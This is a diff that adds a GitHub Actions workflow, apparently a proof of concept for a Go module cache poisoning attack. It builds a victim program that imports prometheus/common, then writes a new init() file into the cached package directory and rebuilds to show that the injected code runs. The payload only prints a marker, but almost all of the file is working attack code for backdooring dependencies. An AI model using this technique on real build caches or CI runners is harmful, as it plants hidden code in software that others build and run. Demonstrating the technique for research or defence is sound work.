@@ -1,0 +1,78 @@
+name: Test Prometheus Attack (End-to-End)
+on: workflow_dispatch
+
+jobs:
+  full-attack:
+    name: "Poison cache → build → prove init() runs"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+          cache: false
+
+      - name: "Step 1: Create a Go project that imports prometheus/common"
+        run: |
+          mkdir -p /tmp/victim && cd /tmp/victim
+          go mod init victim
+          cat > main.go << 'EOF'
+          package main
+
+          import (
+            "fmt"
+            _ "github.com/prometheus/common/promslog"
+          )
+
+          func main() {
+            fmt.Println("victim binary running")
+          }
+          EOF
+          go mod tidy
+
+      - name: "Step 2: Build BEFORE poisoning (baseline)"
+        run: |
+          cd /tmp/victim
+          go build -o victim_clean .
+          echo "=== Running clean binary ==="
+          ./victim_clean
+
+      - name: "Step 3: Poison the cached module (our payload)"
+        run: |
+          pkgdir=$(find ~/go/pkg/mod -not -path "*/cache/*" -type d -path "*/prometheus/common*" 2>/dev/null | grep promslog | head -1)
+          if [ -z "$pkgdir" ]; then
+            pkgdir=$(find ~/go/pkg/mod -not -path "*/cache/*" -type d -path "*/prometheus/*" 2>/dev/null | head -1)
+          fi
+          echo "Target dir: $pkgdir"
+          pkgname=$(grep -r "^package " "$pkgdir"/ 2>/dev/null | grep '\.go:' | head -1 | awk '{print $2}')
+          [ -z "$pkgname" ] && pkgname="main"
+          echo "Package name: $pkgname"
+          chmod +w "$pkgdir"
+          printf 'package %s\n\nimport "fmt"\n\nfunc init() {\n\tfmt.Println("EACTION BACKDOOR EXECUTED")\n}\n' "$pkgname" > "$pkgdir/eaction_cache_init.go"
+          echo "=== Injected file ==="
+          cat "$pkgdir/eaction_cache_init.go"
+
+      - name: "Step 4: Rebuild from poisoned cache"
+        run: |
+          cd /tmp/victim
+          go build -o victim_poisoned .
+          echo "=== Running poisoned binary ==="
+          ./victim_poisoned
+
+      - name: "Step 5: Compare outputs"
+        run: |
+          cd /tmp/victim
+          echo "=== Clean binary output ==="
+          ./victim_clean > /tmp/clean.txt 2>&1
+          cat /tmp/clean.txt
+          echo ""
+          echo "=== Poisoned binary output ==="
+          ./victim_poisoned > /tmp/poisoned.txt 2>&1
+          cat /tmp/poisoned.txt
+          echo ""
+          echo "=== Diff ==="
+          if diff /tmp/clean.txt /tmp/poisoned.txt > /dev/null 2>&1; then
+            echo "FAIL: outputs are identical — backdoor did NOT execute"
+          else
+            echo "SUCCESS: outputs differ — backdoor EXECUTED"
+            diff /tmp/clean.txt /tmp/poisoned.txt || true
+          fi
